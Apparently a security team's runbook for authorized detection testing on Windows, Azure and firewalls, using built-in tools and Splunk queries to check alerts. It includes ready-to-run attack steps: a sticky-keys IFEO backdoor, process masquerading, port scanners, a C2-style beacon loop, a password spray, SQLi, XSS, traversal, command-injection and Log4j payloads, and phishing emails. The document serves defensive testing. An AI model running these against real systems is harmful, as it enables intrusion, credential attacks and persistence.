# TDA Manual Simulation Runbook — All Use Cases (No Downloads)

For a **Windows machine with admin rights** where **Halcyon blocks any download**.
Every test below uses **built-in Windows tools only** (PowerShell, CMD, browser) —
no nmap, no Atomic Red Team, no sqlmap, no Az CLI. Each use case is written as
**What to do → How to do (step by step) → Validate → Cleanup**.

> **Key point:** if Halcyon or the EDR **blocks** an action (a file, a script, a
> connection), that block **is a detection** — screenshot it and record it as a
> PASS. A gap is when the action runs and *nothing* is logged/alerted.
>
> **Rules of engagement:** authorized testing only. Note UTC time + host/IP per
> test. Announce to SOC. Use only fake test data. Replace every `<PLACEHOLDER>`.

## One-time setup (Admin PowerShell)
```powershell
mkdir C:\TDA -Force ; cd C:\TDA               # working folder — run everything here
auditpol /set /subcategory:"Process Creation" /success:enable   # enable 4688 logging
auditpol /set /subcategory:"Process Creation" /failure:enable
```
Marker to run before each test:
```powershell
Get-Date -Format "yyyy-MM-dd HH:mm:ss" ; hostname ; ipconfig | findstr IPv4
```

---

# GROUP A — Host / Endpoint (all native, no downloads)

## UC0032 — Critical Malware Detected on EDR
**What to do:** create the EICAR test file (harmless AV test string) on disk and open it.
**How:**
```powershell
$e = 'X5O!P%@AP[4' + '\PZX54(P^)7CC)7}' + '$EICAR-STANDARD-' + 'ANTIVIRUS-TEST-FILE!$H+H*'
Set-Content -Path "C:\TDA\eicar.com" -Value $e -Encoding Ascii
Get-Content "C:\TDA\eicar.com"
```
**Validate:** EDR alert `EICAR-Test-File`.
```spl
index=* host="<HOSTNAME>" ("EICAR" OR "Test-File") earliest=-15m
| table _time host threat_name action file_path
```
**Cleanup:** `Remove-Item C:\TDA\eicar.com -Force -ErrorAction SilentlyContinue`

## UC0149 — Multiple AV Infections on Same Host
**What to do:** create several EICAR files so the AV logs multiple hits.
**How:**
```powershell
$e = 'X5O!P%@AP[4' + '\PZX54(P^)7CC)7}' + '$EICAR-STANDARD-' + 'ANTIVIRUS-TEST-FILE!$H+H*'
1..5 | ForEach-Object { Set-Content "C:\TDA\eicar_$_.com" -Value $e -Encoding Ascii }
Get-ChildItem C:\TDA\eicar_*.com | ForEach-Object { Get-Content $_.FullName | Out-Null }
```
**Validate:** `... ("EICAR" OR "Test-File") | stats dc(file_path) as infections by host | where infections>=2`
**Cleanup:** `Remove-Item C:\TDA\eicar_*.com -Force`

## UC0125 — Common Ransomware Extensions Detected
**What to do:** create many files and rename them to known ransomware extensions + a ransom note.
**How:**
```powershell
$dir="C:\TDA\ransom"; New-Item -ItemType Directory -Force $dir | Out-Null
$ext=".locky",".crypt",".encrypted",".wncry",".cerber",".zepto",".crypto",".enc"
1..20 | ForEach-Object { $f="$dir\doc$_.txt"; "data" | Set-Content $f; Rename-Item $f "$dir\doc$_$($ext[$_ % $ext.Count])" }
"Your files are encrypted. Pay to recover." | Set-Content "$dir\READ_ME_DECRYPT.txt"
```
**Validate:** `... (".locky" OR ".wncry" OR ".encrypted" OR "READ_ME_DECRYPT")`
**Cleanup:** `Remove-Item C:\TDA\ransom -Recurse -Force`

## UC0036 — APT Group Process Creation (Masquerading)
**What to do:** copy `cmd.exe`, rename it to `lsass.exe` in a non-standard folder, run it.
**How:**
```powershell
Copy-Item C:\Windows\System32\cmd.exe C:\Windows\Temp\lsass.exe
Start-Process C:\Windows\Temp\lsass.exe
Get-Process lsass | Select-Object Id,Path,StartTime   # fake one shows path C:\Windows\Temp
```
**Validate:**
```spl
index=* host="<HOSTNAME>" EventCode=4688 New_Process_Name="*lsass.exe" earliest=-15m
| table _time Creator_Process_Name New_Process_Name Process_Command_Line
```
Tell: `New_Process_Name = C:\Windows\Temp\lsass.exe` (wrong path). If EDR kills it on launch = detection.
**Cleanup:** `Stop-Process -Name lsass -Force -EA SilentlyContinue; Remove-Item C:\Windows\Temp\lsass.exe -Force -EA SilentlyContinue`

## UC0182 — Application Parents Spawning Malicious Children
**What to do:** make a script host (`wscript.exe`) spawn `cmd.exe` — the parent→child anomaly.
**How:**
```powershell
Set-Content "C:\TDA\uc0182.vbs" 'CreateObject("WScript.Shell").Run "cmd.exe /c whoami > C:\TDA\uc0182.txt"'
wscript.exe "C:\TDA\uc0182.vbs"
Get-Content "C:\TDA\uc0182.txt"    # confirms the child ran
```
**Validate:**
```spl
index=* host="<HOSTNAME>" EventCode=4688 New_Process_Name="*cmd.exe" Creator_Process_Name="*wscript.exe" earliest=-15m
| table _time Creator_Process_Name New_Process_Name Process_Command_Line
```
**Cleanup:** `Remove-Item C:\TDA\uc0182.* -Force`

## UC0185 — Abuse of Accessibility Binaries (Sticky Keys / Shift ×5)
**What to do:** set `cmd.exe` as the debugger for `sethc.exe` via registry (reversible, no file replace).
**How:**
```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```
(Optional proof: lock screen → press Shift ×5 → SYSTEM cmd opens.)
**Validate:**
```spl
index=* host="<HOSTNAME>" ("Image File Execution Options" AND ("sethc.exe" OR "utilman.exe")) earliest=-15m
| table _time host EventCode Object_Name Process_Command_Line
```
**Cleanup:** `reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f`

## SPLUC0187 — Scheduled Task Calling Malicious Child Process
**What to do:** create + run a scheduled task that launches a shell.
**How:**
```powershell
schtasks /create /tn "uc0187test" /tr "cmd.exe /c whoami > C:\TDA\uc0187.txt" /sc once /st 23:59 /f
schtasks /run /tn "uc0187test"
schtasks /delete /tn "uc0187test" /f
```
**Validate:**
```spl
index=* host="<HOSTNAME>" EventCode=4688 New_Process_Name="*cmd.exe" Creator_Process_Name="*svchost.exe" earliest=-15m
| table _time Creator_Process_Name New_Process_Name Process_Command_Line
```
(Task creation also = EventCode 4698.)

## UC0043 — Threat Activity Detected (recon burst)
**What to do:** run several attacker-style discovery commands quickly.
**How:**
```powershell
whoami /all; net user; net group "domain admins" /domain; systeminfo; tasklist; nltest /domain_trusts; net accounts /domain
```
**Validate:** many discovery processes (4688) from one host in a short window.

---

# GROUP B — Network (native PowerShell, no nmap)

## UC0053 — Horizontal Port Scan (one port, many hosts)
**What to do:** connect to one port across a whole subnet using native TCP sockets.
**How:**
```powershell
$port=445
"172.16.75","172.16.5" | ForEach-Object { $s=$_; 1..254 | ForEach-Object {
  $ip="$s.$_"; $t=New-Object System.Net.Sockets.TcpClient
  $c=$t.BeginConnect($ip,$port,$null,$null)
  if($c.AsyncWaitHandle.WaitOne(120)){"$ip:$port OPEN"; try{$t.EndConnect($c)}catch{}}
  $t.Close() } }
```
**Validate:** `index=* src="<YOUR_IP>" dest_port=445 | stats dc(dest_ip) as hosts by src | where hosts>=51`

## UC0054 — Vertical Port Scan (many ports, one host)
**What to do:** connect to many ports on one target.
**How:**
```powershell
$ip="<TARGET>"
1..1024 | ForEach-Object { $p=$_; $t=New-Object System.Net.Sockets.TcpClient
  $c=$t.BeginConnect($ip,$p,$null,$null)
  if($c.AsyncWaitHandle.WaitOne(120)){"$ip:$p OPEN"; try{$t.EndConnect($c)}catch{}}
  $t.Close() }
```
**Validate:** `index=* src="<YOUR_IP>" dest="<TARGET>" | stats dc(dest_port) as ports by dest | where ports>=100`

## UC0249 — Prohibited Port Activity Detected
**What to do:** connect to a policy-forbidden port (e.g. 23, 6667, 4444).
**How:**
```powershell
$ip="<TARGET>"; 23,6667,4444 | ForEach-Object {
  $p=$_; $r=Test-NetConnection $ip -Port $p -WarningAction SilentlyContinue
  "$ip:$p -> $($r.TcpTestSucceeded)" }
```
**Validate:** firewall/proxy log shows a session to the prohibited port from your IP.

## UC0141 — C2 / Command-and-Control Traffic
**What to do:** send periodic beacon-like requests to a **lab-controlled** host (never real malware infra).
**How:**
```powershell
$c2="http://<LAB_C2_HOST>/beacon"
1..30 | ForEach-Object {
  try { Invoke-WebRequest $c2 -UseBasicParsing -TimeoutSec 5 -Headers @{ "User-Agent"="Mozilla/5.0 (compatible; beacon)" } | Out-Null } catch {}
  Start-Sleep -Seconds 10 }
```
**Validate:** proxy/firewall logs — same src→dest, regular interval, many small requests.

## UC0046 — Password Spray Detected
**What to do:** try one password against many accounts (agree accounts/list first — avoid lockouts).
**How:**
```powershell
# build a user list natively:
(net user /domain) | Out-File C:\TDA\users.txt
$users = Get-Content C:\TDA\users.txt | Where-Object {$_ -match '^\S' } 
$pw = "Winter2026!"
foreach ($u in $users) {
  cmd /c "net use \\<DC>\IPC$ /user:$u $pw" 2>$null
  Start-Sleep -Milliseconds 300
}
```
**Validate:** `index=* EventCode=4625 | stats dc(user) as accounts by src | where accounts>=10`

---

# GROUP C — Web (native Invoke-WebRequest, no sqlmap)

## UC0228 — SQL Injection Attempt (pattern match)
**What to do:** send SQLi patterns in URL parameters to the web app.
**How:**
```powershell
$u="http://<WEBAPP>"
"1' OR '1'='1","1; DROP TABLE users--","' UNION SELECT null,username,password FROM users--" | ForEach-Object {
  $p=[uri]::EscapeDataString($_)
  try { Invoke-WebRequest "$u/product?id=$p" -UseBasicParsing -TimeoutSec 5 | Out-Null } catch {} }
```
**Validate:** WAF/web logs show SQLi patterns from your source IP.

## UC0229 — Web Application Exploit Detected
**What to do:** send common exploit payloads (XSS, path traversal, command injection, Log4j probe).
**How:**
```powershell
$u="http://<WEBAPP>"
@("/search?q=<script>alert(1)</script>","/download?file=../../../../etc/passwd","/ping?host=127.0.0.1;whoami",'/api?x=${jndi:ldap://127.0.0.1/a}') |
  ForEach-Object { try { Invoke-WebRequest "$u$_" -UseBasicParsing -TimeoutSec 5 | Out-Null } catch {} }
```
**Validate:** WAF/IPS/web logs flag the exploit patterns from your IP.

---

# GROUP D — Email / DLP (native cmdlets; needs a mail path)

## UC0222 — Suspicious Email Attachment / Malware by Mail
**What to do:** email an EICAR attachment + a risky-extension file into a monitored mailbox.
**Requires:** an SMTP server/relay you can send through + a target mailbox.
**How:**
```powershell
Copy-Item C:\Windows\System32\calc.exe C:\TDA\invoice.exe   # risky extension (built-in file, no download)
Send-MailMessage -From "tester@yourlab.local" -To "<victim@customer.com>" `
  -Subject "Invoice attached" -Body "Please review." `
  -Attachments "C:\TDA\eicar.com","C:\TDA\invoice.exe" -SmtpServer "<SMTP_SERVER>"
```
**Validate:** mail security/SIEM shows malware verdict or blocked extension.

## SPLUC0107 — Suspected Phishing Email
**What to do:** send a phishing-style email (lookalike sender, urgency, suspicious link).
**Requires:** SMTP relay + monitored mailbox.
**How:**
```powershell
Send-MailMessage -From "security-alert@micros0ft-support.com" -To "<victim@customer.com>" `
  -Subject "URGENT: Your account will be suspended" `
  -Body "Verify now: http://<LAB_PHISH_HOST>/login" -SmtpServer "<SMTP_SERVER>"
```
**Validate:** mail/phishing detection flags the message.

## UC0575 — Multiple DLP Violations for a User
**What to do:** create files with fake sensitive data and push them through a DLP-monitored channel several times.
**Requires:** a DLP solution watching email/upload/USB.
**How:**
```powershell
$dir="C:\TDA\dlp"; New-Item -ItemType Directory -Force $dir | Out-Null
1..5 | ForEach-Object {
@"
Credit Card: 4111 1111 1111 1111
SSN: 123-45-6789
IBAN: GB82 WEST 1234 5698 7654 32
"@ | Set-Content "$dir\sensitive_$_.txt" }
# then send each out (repeat to create multiple violations):
Get-ChildItem $dir | ForEach-Object { Send-MailMessage -From "<you>" -To "<external@test.com>" -Subject "data" -Attachments $_.FullName -SmtpServer "<SMTP_SERVER>" }
```
**Validate:** DLP console/SIEM shows ≥2 violations for the same user.

---

# GROUP E — Cloud: Azure / M365 (via BROWSER — no Az CLI download needed)

> Since downloads are blocked, do all cloud tests in the **browser** (Azure Portal
> / Entra portal / Azure Cloud Shell). No local install required.
> **Requires:** an Azure/M365 test account with the right role.

## UC0458 — Azure Activity CRUD Operation Detected
**What to do:** create/modify/delete an Azure resource in the portal.
**How:** `https://portal.azure.com` → Resource groups → **Create** a group `tda-test-rg` → add a **tag** (update) → **Delete** the group. (Or use **Cloud Shell** in the portal: `az group create/update/delete` — runs in browser, nothing installed.)
**Validate:** Azure Activity Log / Sentinel shows the create/update/delete.

## UC0215 — Explicit MFA Deny
**What to do:** sign in with a test account and DENY the MFA prompt.
**How:** open `https://portal.office.com` in a private window → sign in as the test user → at the Authenticator push, tap **Deny / "No, it's not me"** (or reject).
**Validate:** Entra sign-in logs show MFA denied / user declined.

## UC0327 — Azure AD Privileged Access Outside PIM
**What to do:** assign/use a privileged role directly instead of activating via PIM.
**How:** Entra portal → Roles and administrators → assign e.g. **User Access Administrator** to the test user as a **permanent** (non-PIM) assignment, then perform an admin action.
**Validate:** Entra audit log shows privileged assignment/action without a PIM activation.

## Password Spraying M365
**What to do:** try one password across several M365 accounts.
**How (no tool download):** in a browser, attempt sign-in at `https://login.microsoftonline.com` with the same password across a few agreed test accounts; or run from Cloud Shell if scripting is allowed. Keep it small to avoid lockouts.
**Validate:** Entra sign-in logs — multiple failed logons across accounts from one source.

## Malicious MFA Takeover
**What to do:** simulate MFA fatigue or register a new MFA method on a test account.
**How:** repeatedly attempt sign-in to spam Authenticator push prompts, or go to `https://aka.ms/mfasetup` and add a new MFA method to the test account.
**Validate:** Entra logs show repeated MFA requests or a new security-info registration.

## Abusing Virtual Machines
**What to do:** run a command on an Azure VM via the control plane (Run Command).
**How:** Azure Portal → the VM → **Run command** → **RunPowerShellScript** → enter `whoami; hostname` → Run. (No local tooling.)
**Validate:** Activity log shows `runCommand` on the VM.

---

# GROUP F — Firewall

## UC0110 — Privilege Change on Firewall
**What to do:** create/modify an admin account or change an admin role on the firewall.
**Requires:** **admin access to the firewall** (done on the firewall, not this PC).
**How (vendor examples):**
- Palo Alto: `set mgt-config users tdatest permissions role-based superuser yes` → `commit`
- Fortinet: `config system admin` → `edit tdatest` → `set accprofile super_admin` → `end`
**Validate:** firewall admin/audit logs (to SIEM) show the privilege change.

---

## Per-test checklist
1. Note UTC time + host/IP.  2. Announce to SOC.  3. Run the steps from `C:\TDA`.
4. If Halcyon/EDR **blocks** it → screenshot = PASS (detection). 
5. Pull events with the SPL (adjust index/field names).  6. Record pass/gap.  7. Clean up.

*No downloads used — all built-in Windows tools + browser for cloud. Field names vary by data source; use only fake test data and lab-controlled hosts.*
